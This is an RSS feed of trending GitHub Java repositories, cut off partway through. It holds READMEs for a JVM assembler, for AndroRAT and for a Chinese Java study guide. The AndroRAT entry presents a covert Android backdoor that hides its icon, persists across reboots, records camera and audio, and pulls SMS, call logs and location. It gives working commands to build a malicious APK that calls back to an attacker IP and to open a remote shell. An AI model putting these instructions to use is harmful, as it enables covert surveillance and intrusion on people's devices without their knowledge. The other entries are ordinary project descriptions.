<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Java Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-06-06T01:36:03Z</updated>
  <subtitle>Daily Trending of Java in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>roscopeco/jasm</title>
    <updated>2022-06-06T01:36:03Z</updated>
    <id>tag:github.com,2022-06-06:/roscopeco/jasm</id>
    <link href="https://github.com/roscopeco/jasm" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A JVM assembler for the modern age&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;JASM - A JVM Assembler for the modern age&lt;/h2&gt; &#xA;&lt;h3&gt;What?&lt;/h3&gt; &#xA;&lt;p&gt;JASM is an assembler for JVM bytecode. Because how many times have you needed &lt;em&gt;that&lt;/em&gt; already today?&lt;/p&gt; &#xA;&lt;p&gt;JASM has a &lt;a href=&#34;https://github.com/roscopeco/jasm-gradle-plugin&#34;&gt;Gradle plugin&lt;/a&gt; and a (WIP) &lt;a href=&#34;https://github.com/roscopeco/jasm-intellij-plugin&#34;&gt;Plugin for IntelliJ&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;See the &lt;a href=&#34;https://github.com/roscopeco/jasm-example&#34;&gt;Example Gradle project&lt;/a&gt; for an example of how JASM might fit in to your project.&lt;/p&gt; &#xA;&lt;p&gt;Let&#39;s just get this out of the way, shall we?&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public class com/example/HelloWorld {&#xA;    public static main([java/lang/String)V {&#xA;        getstatic java/lang/System.out&#xA;        ldc &#34;Hello, World&#34;&#xA;        invokevirtual java/io/PrintStream.println(java/lang/String)V&#xA;        return&#xA;    }&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;All your favourite instructions (in fact, &lt;em&gt;all&lt;/em&gt; the JVM instructions) are supported:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public class com/example/MyClass&#xA;extends com/example/Superclass&#xA;implements com/example/SomeInterface {&#xA;    public &amp;lt;init&amp;gt;()V {&#xA;        aload 0&#xA;        invokespecial com/example/Superclass.&amp;lt;init&amp;gt;()V&#xA;        return&#xA;    }&#xA;&#xA;    public dontAddCanary(java/util/List)V {&#xA;        goto skipAdd&#xA;&#xA;        aload 1&#xA;        ldc &#34;CANARY&#34;&#xA;        invokeinterface java/util/List.add(java/lang/Object)Z &#xA;        &#xA;    skipAdd:&#xA;        return&#xA;    }&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;And you can use advanced JVM features like &lt;code&gt;invokedynamic&lt;/code&gt; and dynamic constants that aren&#39;t directly available in the Java language:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public doBasicInvokeDynamicTest()java/lang/String {&#xA;    invokedynamic get()java/util/function/Supplier {&#xA;        invokestatic java/lang/invoke/LambdaMetafactory.metafactory(&#xA;            java/lang/invoke/MethodHandles$Lookup,&#xA;            java/lang/String,&#xA;            java/lang/invoke/MethodType,&#xA;            java/lang/invoke/MethodType,&#xA;            java/lang/invoke/MethodHandle,&#xA;            java/lang/invoke/MethodType,&#xA;        )java/lang/invoke/CallSite&#xA;        [&#xA;            ()java/lang/Object,&#xA;            invokestatic com/roscopeco/jasm/model/TestBootstrap.lambdaGetImpl()java/lang/String,&#xA;            ()java/lang/String&#xA;        ]&#xA;    }&#xA;    &#xA;    invokeinterface java/util/function/Supplier.get()java/lang/Object&#xA;    checkcast java/lang/String&#xA;    areturn&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;There&#39;s a smidge of syntactic sugar around types in case you just can&#39;t get used to the JVM internal names (for primitives), so you can do e.g. :&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public myGreatMethod(int, long, java/util/List) java/util/List {&#xA;    &#xA;    // cool assembly stuff...&#xA;        &#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;There are lots of examples in &lt;a href=&#34;https://raw.githubusercontent.com/roscopeco/jasm/develop/src/test/resources/jasm&#34;&gt;the tests&lt;/a&gt; showing the syntax for the different instructions and with examples of how they&#39;re used.&lt;/p&gt; &#xA;&lt;h3&gt;Why not just use Jasmin?&lt;/h3&gt; &#xA;&lt;p&gt;The venerable &lt;a href=&#34;https://github.com/davidar/jasmin&#34;&gt;Jasmin&lt;/a&gt; project has been around for years, and has the advantage of being mature, stable, and well supported everywhere (for example, Github does syntax highlighting for it). So why not just use that?&lt;/p&gt; &#xA;&lt;p&gt;Of course it&#39;s totally personal choice which you use, but there are a few reasons to choose JASM over Jasmin:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;JASM supports all the modern features of the latest JVMs, such as &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;invokedynamic&lt;/code&gt; and dynamic constants&lt;/li&gt; &#xA;   &lt;li&gt;&lt;code&gt;record&lt;/code&gt; classes etc&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;JASM has some nice &#34;quality of life&#34; features, such as automatically computing stack map frames / maxlocals for you&lt;/li&gt; &#xA; &lt;li&gt;JASM is built on modern tooling, whereas Jasmin&#39;s code is showing its age a bit &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;This makes it easy, for example, to build &lt;a href=&#34;https://github.com/roscopeco/jasm-gradle-plugin&#34;&gt;Gradle&lt;/a&gt; and &lt;a href=&#34;https://github.com/roscopeco/jasm-intellij-plugin&#34;&gt;IntelliJ&lt;/a&gt; integration for JASM&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;JASM has (IMHO) a cleaner syntax than Jasmin&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;How?&lt;/h3&gt; &#xA;&lt;h4&gt;Requirements&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Java 11 or higher is required to run the tool and/or gradle plugin &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;(However, JASM can assemble classes targeted at any JVM version!)&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Using the Gradle plugin&lt;/h4&gt; &#xA;&lt;p&gt;If you just want to use some JASM code in your own Gradle project, the easiest way to get started is via the &lt;a href=&#34;https://plugins.gradle.org/plugin/com.roscopeco.jasm&#34;&gt;Gradle plugin&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;For more information and some documentation about the plugin, see the &lt;a href=&#34;https://github.com/roscopeco/jasm-gradle-plugin&#34;&gt;Github repo&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Using the command-line tool&lt;/h4&gt; &#xA;&lt;p&gt;If you &lt;a href=&#34;https://github.com/roscopeco/jasm/releases&#34;&gt;downloaded a binary distribution&lt;/a&gt; then you should be all set. Inside the archive you&#39;ll find a `bin/jasm&#39; script that will take care of running the command-line tool for you.&lt;/p&gt; &#xA;&lt;p&gt;To see usage details:&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;bin/jasm --help&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;To simply assemble a file &lt;code&gt;src/com/example/MyClass.jasm&lt;/code&gt; to the &lt;code&gt;classes&lt;/code&gt; directory:&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;bin/jasm -i src -o classes com/example/MyClass.jasm&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;Notice that you set the source and destination directories, and just pass the relative path to the files within them - this is how the assembler creates the class files in the appropriate place the JVM expects to find them.&lt;/p&gt; &#xA;&lt;h4&gt;Building the tool with Gradle&lt;/h4&gt; &#xA;&lt;p&gt;If you grabbed the source from &lt;a href=&#34;https://github.com/roscopeco/jasm&#34;&gt;Github&lt;/a&gt; you can easily build a binary distribution with &lt;code&gt;./gradlew clean assemble&lt;/code&gt; (pun not intended).&lt;/p&gt; &#xA;&lt;h4&gt;Using JASM as a library&lt;/h4&gt; &#xA;&lt;p&gt;If you want to use this as a library (with Maven or Gradle), you&#39;ll want to pull in the dependency from Maven central.&lt;/p&gt; &#xA;&lt;p&gt;E.g. (for Gradle):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-kotlin&#34;&gt;dependencies {&#xA;  implementation(&#34;com.roscopeco.jasm:jasm:0.4.0&#34;)&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Why??&lt;/h3&gt; &#xA;&lt;p&gt;Well, &lt;strong&gt;why not&lt;/strong&gt;?&lt;/p&gt; &#xA;&lt;p&gt;I wrote this for fun, which I had both in writing it and playing with it.&lt;/p&gt; &#xA;&lt;p&gt;I release it without any real expectation that it will be &lt;em&gt;useful&lt;/em&gt;, but with the sincere hope that you too might find it fun.&lt;/p&gt; &#xA;&lt;p&gt;If you really need some use-cases to justify the electrons squandered in pursuit of this project, how about these (some lifted from Jasmin&#39;s README):&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Curious People - Want to understand more about the way JVM bytecode works or the things that are possible at the bytecode level? Always wondered what &lt;code&gt;invokedynamic&lt;/code&gt; is for? Curious as to how &lt;code&gt;@SneakyThrows&lt;/code&gt; can possibly work? This might help!&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;System Implementors - If you&#39;re writing a JVM or runtime this could be useful for generating test classes...&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Advanced Programmers - You could hand-generate critical classes or methods if you think Javac isn&#39;t doing the right thing (but spoiler alert: by this point, it almost certainly is).&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Language Implementors - You could use this as an IL if you liked, rather than getting involved in the nuts and bolts of the binary &lt;code&gt;.class&lt;/code&gt; format.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Security Researchers - Create hostile classes and see if you can sneak them past the class verifier.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Teachers - Perhaps you&#39;re teaching a compiler course, maybe you could use this to introduce students to JVM bytecode, or even as an IL for the compilers.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Who?&lt;/h3&gt; &#xA;&lt;p&gt;JASM is copyright 2022 Ross Bamford (roscopeco AT gmail DOT com).&lt;/p&gt; &#xA;&lt;p&gt;See LICENSE.md for the gory legal stuff (spoiler: MIT).&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>karma9874/AndroRAT</title>
    <updated>2022-06-06T01:36:03Z</updated>
    <id>tag:github.com,2022-06-06:/karma9874/AndroRAT</id>
    <link href="https://github.com/karma9874/AndroRAT" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A Simple android remote administration tool using sockets. It uses java on the client side and python on the server side&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;strong&gt;Disclaimer&lt;/strong&gt; : This software is meant for educational purposes only. I&#39;m not responsible for any malicious use of the app.&lt;/p&gt; &#xA;&lt;h1&gt;AndroRAT&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://opensource.org/licenses/MIT&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/license-MIT-blue.svg?sanitize=true&#34; alt=&#34;MIT License&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://twitter.com/karma9874&#34;&gt;&lt;img src=&#34;https://img.shields.io/twitter/follow/karma9874?label=Follow&amp;amp;style=social&#34; alt=&#34;Twitter Follow&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/karma9874&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/followers/karma9874?label=Follow&amp;amp;style=social&#34; alt=&#34;GitHub followers&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;AndroRAT is a tool designed to give the control of the android system remotely and retrieve informations from it. Androrat is a client/server application developed in Java Android for the client side and the Server is in Python.&lt;/p&gt; &#xA;&lt;h5&gt;AndroRAT will work on device from Android 4.1 (Jelly Bean) to Android 9.0 (Oreo) (API 16 to API 28)&lt;/h5&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;AndroRAT also works on Android 10 (Q) but some of the interpreter command will be unstable.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h2&gt;Screenshots&lt;/h2&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/karma9874/AndroRAT/master/Screenshots/5.jpg&#34; alt=&#34;AndroRAT&#34; title=&#34;AndroRAT in action&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Features of AndroRAT&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Full persistent backdoor&lt;/li&gt; &#xA; &lt;li&gt;&lt;del&gt;Fully undetectable by any antivirus scanner &lt;a href=&#34;https://www.virustotal.com/gui/file/e900b5d37ad8c8f79ca000b148253af04696a85fdfc245861cfb226dd86562df/detection&#34;&gt;VirusTotal&lt;/a&gt;&lt;/del&gt;&lt;/li&gt; &#xA; &lt;li&gt;Invisible icon on install&lt;/li&gt; &#xA; &lt;li&gt;Light weight apk which runs 24*7 in background&lt;/li&gt; &#xA; &lt;li&gt;App starts automatically on boot up&lt;/li&gt; &#xA; &lt;li&gt;Can record audio, video, take picture from both camera&lt;/li&gt; &#xA; &lt;li&gt;Browse call logs and SMS logs&lt;/li&gt; &#xA; &lt;li&gt;Get current location, sim card details ,ip, mac address of the device&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Prerequisites&lt;/h2&gt; &#xA;&lt;p&gt;AndroRAT requires Python3 and JAVA (or Android Studio)&lt;/p&gt; &#xA;&lt;h2&gt;Installation&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;git clone https://github.com/karma9874/AndroRAT.git&#xA;cd AndroRAT&#xA;pip install -r requirements.txt&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Note:&lt;/h4&gt; &#xA;&lt;p&gt;While cloning the repository using Git bash on Windows, you may get the following error:&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;error: unable to create file &amp;lt;filename&amp;gt;: Filename too long&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;This is because the Git has a limit of 4096 characters for a filename, except on Windows when Git is compiled with msys. It uses an older version of the Windows API and there&#39;s a limit of 260 characters for a filename.&lt;/p&gt; &#xA;&lt;p&gt;You can circumvent this by setting &lt;code&gt;core.longpaths&lt;/code&gt; to &lt;code&gt;true&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;git config --system core.longpaths true&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;You must run Git bash with administrator privileges.&lt;/p&gt; &#xA;&lt;h2&gt;Usage (Windows and Linux)&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;To get the control panel of the app dial &lt;code&gt;*#*#1337#*#*&lt;/code&gt; (For now it has only two options &lt;code&gt;Restart Activity&lt;/code&gt; and &lt;code&gt;Uninstall&lt;/code&gt;)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Note: In order to use this feature in some devices you need to enable the option &lt;code&gt;display pop-up windows running in background&lt;/code&gt; from the settings.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h3&gt;Available Modes&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;--build&lt;/code&gt; - for building the android apk&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;--ngrok&lt;/code&gt; - for using ngrok tunnel (over the internet)&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;--shell&lt;/code&gt; - getting an interactive shell of the device&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;&lt;code&gt;build&lt;/code&gt; mode&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;Usage:&#xA;  python3 androRAT.py --build --ngrok [flags]&#xA;  Flags:&#xA;    -p, --port              Attacker port number (optional by default its set to 8000)&#xA;    -o, --output            Name for the apk file (optional by default its set to &#34;karma.apk&#34;)&#xA;    -icon, --icon           Visible icon after installing apk (by default set to hidden)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code&gt;Usage:&#xA;  python3 androRAT.py --build [flags]&#xA;  Flags:&#xA;    -i, --ip                Attacker IP address (required)&#xA;    -p, --port              Attacker port number (required)&#xA;    -o, --output            Name for the apk file (optional)&#xA;    -icon, --icon           Visible icon after installing apk (by default set to hidden)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Or you can manually build the apk by importing &lt;a href=&#34;https://raw.githubusercontent.com/karma9874/AndroRAT/master/Android_Code&#34;&gt;Android Code&lt;/a&gt; folder to Android Studio and changing the IP address and port number in &lt;a href=&#34;https://raw.githubusercontent.com/karma9874/AndroRAT/master/Android_Code/app/src/main/java/com/example/reverseshell2/config.java&#34;&gt;config.java&lt;/a&gt; file and then you can generate the signed apk from &lt;code&gt;Android Studio -&amp;gt; Build -&amp;gt; Generate Signed APK(s)&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;code&gt;shell&lt;/code&gt; mode&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;Usage:&#xA;  python3 androRAT.py --shell [flags]&#xA;  Flags:&#xA;    -i, --ip                Listner IP address&#xA;    -p, --port              Listner port number&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;After running the &lt;code&gt;shell&lt;/code&gt; mode you will get an interpreter of the device&lt;/p&gt; &#xA;&lt;p&gt;Commands which can run on the interpreter&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;    deviceInfo                 --&amp;gt; returns basic info of the device&#xA;    camList                    --&amp;gt; returns cameraID  &#xA;    takepic [cameraID]         --&amp;gt; Takes picture from camera&#xA;    startVideo [cameraID]      --&amp;gt; starts recording the video&#xA;    stopVideo                  --&amp;gt; stop recording the video and return the video file&#xA;    startAudio                 --&amp;gt; starts recording the audio&#xA;    stopAudio                  --&amp;gt; stop recording the audio&#xA;    getSMS [inbox|sent]        --&amp;gt; returns inbox sms or sent sms in a file &#xA;    getCallLogs                --&amp;gt; returns call logs in a file&#xA;    shell                      --&amp;gt; starts a sh shell of the device&#xA;    vibrate [number_of_times]  --&amp;gt; vibrate the device number of time&#xA;    getLocation                --&amp;gt; return the current location of the device&#xA;    getIP                      --&amp;gt; returns the ip of the device&#xA;    getSimDetails              --&amp;gt; returns the details of all sim of the device&#xA;    clear                      --&amp;gt; clears the screen&#xA;    getClipData                --&amp;gt; return the current saved text from the clipboard&#xA;    getMACAddress              --&amp;gt; returns the mac address of the device&#xA;    exit                       --&amp;gt; exit the interpreter&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;In the sh shell there are some sub commands&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;    get [full_file_path]        --&amp;gt; donwloads the file to the local machine (file size upto 15mb)&#xA;    put [filename]              --&amp;gt; uploads the file to the android device&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Examples&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;To build the apk using ngrok which will also set the listner: &lt;code&gt;python3 androRAT.py --build --ngrok -o evil.apk&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;To build the apk using desired ip and port: &lt;code&gt;python3 androRAT.py --build -i 192.169.x.x -p 8000 -o evil.apk&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;To get the interpreter: &lt;code&gt;python3 androRAT.py --shell -i 0.0.0.0 -p 8000&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Interpreter Examples&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Generating APK&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/karma9874/AndroRAT/master/Screenshots/6.JPG&#34; width=&#34;800&#34;&gt; &lt;/p&gt; ------------------------------------------------------------------------------------------------------------------------------ &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Some interpreter Commands&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/karma9874/AndroRAT/master/Screenshots/1.JPG&#34; width=&#34;800&#34;&gt; &lt;/p&gt; ------------------------------------------------------------------------------------------------------------------------------ &#xA;&lt;h2&gt;Supporters:&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/rayep&#34;&gt;&lt;img src=&#34;https://avatars.githubusercontent.com/u/40718616?v=4&amp;amp;s=60&#34; alt=&#34;rayep&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;TODO&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;del&gt;Ngrok support&lt;/del&gt;&lt;/li&gt; &#xA; &lt;li&gt;Set up multi client&lt;/li&gt; &#xA; &lt;li&gt;Add screenshot command&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;AndroRAT is licensed under MIT license take a look at the &lt;a href=&#34;https://raw.githubusercontent.com/karma9874/AndroRAT/master/LICENSE&#34;&gt;LICENSE&lt;/a&gt; for more information.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>itwanger/toBeBetterJavaer</title>
    <updated>2022-06-06T01:36:03Z</updated>
    <id>tag:github.com,2022-06-06:/itwanger/toBeBetterJavaer</id>
    <link href="https://github.com/itwanger/toBeBetterJavaer" rel="alternate"></link>
    <summary type="html">&lt;p&gt;一份通俗易懂、风趣幽默的Java学习指南，内容涵盖Java基础、Java并发编程、Java虚拟机、Java企业级开发、Java面试等核心知识点。学Java，就认准Java 程序员进阶之路😄&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/zhishixingqiu/&#34;&gt;👉 沉默王二-《Java 程序员进阶之路》官方知识星球来啦！！！&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;如果你需要专属Java学习/面试小册/一对一交流/简历修改/专属求职指南/学习打卡，不妨花 3 分钟左右看看星球的详细介绍：&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/zhishixingqiu/&#34;&gt;沉默王二-《Java 程序员进阶之路》详细介绍 &lt;/a&gt;（一定要确定自己真的需要再加入，一定要看完详细介绍之后再加我）。&lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;a href=&#34;https://tobebetterjavaer.com&#34;&gt; &lt;img src=&#34;http://cdn.tobebetterjavaer.com/tobebetterjavaer/images/logo-01.png&#34; width=&#34;260px&#34; alt=&#34;Java 程序员进阶之路&#34;&gt; &lt;/a&gt; &lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;a href=&#34;https://github.com/itwanger/toBeBetterJavaer&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/Github-toBeBetterJavaer-red.svg?sanitize=true&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://gitee.com/itwanger/toBeBetterJavaer&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/Gitee-toBeBetterJavaer-blue.svg?sanitize=true&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://space.bilibili.com/513340480&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/bilibili-哔哩哔哩-critical&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://mp.weixin.qq.com/s/ExjM-xdqMFFY1NIZffz-Ng&#34; target=&#34;_blank&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/计算机经典电子书-下载-green.svg&#34; alt=&#34;无套路下载&#34;&gt; &lt;/a&gt; &lt;/p&gt; &#xA;&lt;h1&gt;为什么会有这个开源知识库&lt;/h1&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;[!NOTE] 知识库取名 &lt;strong&gt;toBeBetterJavaer&lt;/strong&gt;，即 &lt;strong&gt;To Be Better Javaer&lt;/strong&gt;，意为「成为一名更好的 Java 程序员」，是自学 Java 以来所有原创文章和学习资料的大聚合。内容包括 Java 基础、Java 并发编程、Java 虚拟机、Java 企业级开发、Java 面试等核心知识点。据说每一个优秀的 Java 程序员都喜欢她，风趣幽默、通俗易懂。学 Java，就认准 Java 程序员进阶之路😄。&lt;/p&gt; &#xA; &lt;p&gt;知识库旨在为学习 Java 的小伙伴提供一系列：&lt;/p&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;strong&gt;优质的原创 Java 教程&lt;/strong&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;strong&gt;全面清晰的 Java 学习路线&lt;/strong&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;strong&gt;免费但靠谱的 Java 学习资料&lt;/strong&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;strong&gt;精选的 Java 岗求职面试指南&lt;/strong&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;strong&gt;Java 企业级开发所需的必备技术&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA; &lt;p&gt;赠人玫瑰手有余香。知识库会持续保持&lt;strong&gt;更新&lt;/strong&gt;，欢迎收藏品鉴！&lt;/p&gt; &#xA; &lt;p&gt;&lt;strong&gt;转载须知&lt;/strong&gt; ：以下所有文章如非文首说明为转载皆为我（沉默王二）的原创，转载在文首注明出处，如发现恶意抄袭/搬运，会动用法律武器维护自己的权益。让我们一起维护一个良好的技术创作环境！&lt;/p&gt; &#xA; &lt;p&gt;推荐你通过在线阅读网站进行阅读，体验更好，速度更快！&lt;/p&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://tobebetterjavaer.com/&#34;&gt;Java 程序员进阶之路在线阅读网站（VuePress 版）&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://docsify.tobebetterjavaer.com/&#34;&gt;Java 程序员进阶之路在线阅读网站（docsify 版）&lt;/a&gt;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA; &lt;p&gt;建议给本仓库点个 star，满足一下我的虚荣心，内容质量也绝对值得你一个 star。我还在继续创作，给我一点继续更新的动力，笔芯。&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h1&gt;知识库地图&lt;/h1&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;[!NOTE] 知识库收录的核心内容就全在这里面了，大类分为 Java 核心、Java 企业级开发、数据库、计算机基础、求职面试、学习资源、程序人生，几乎你需要的这里都有。&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;&lt;img src=&#34;http://cdn.tobebetterjavaer.com/tobebetterjavaer/images/tobebetterjavaer-map.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;h1&gt;学习路线&lt;/h1&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;[!NOTE] 除了 Java 学习路线，还有 C语言、C++、Python、Go 语言、操作系统、前端、蓝桥杯等硬核学习路线，欢迎收藏品鉴！&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/xuexiluxian/java/yitiaolong.md&#34;&gt;Java学习路线一条龙版（建议收藏&lt;span&gt;👍&lt;/span&gt;）&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/xuexiluxian/java/thread.md&#34;&gt;Java并发编程学习路线（建议收藏&lt;span&gt;👍&lt;/span&gt;）&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/xuexiluxian/java/jvm.md&#34;&gt;Java虚拟机学习路线（建议收藏&lt;span&gt;👍&lt;/span&gt;）&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/xuexiluxian/c.md&#34;&gt;C语言学习路线（建议收藏&lt;span&gt;👍&lt;/span&gt;）&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/xuexiluxian/ccc.md&#34;&gt;C++学习路线（建议收藏&lt;span&gt;👍&lt;/span&gt;）&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a 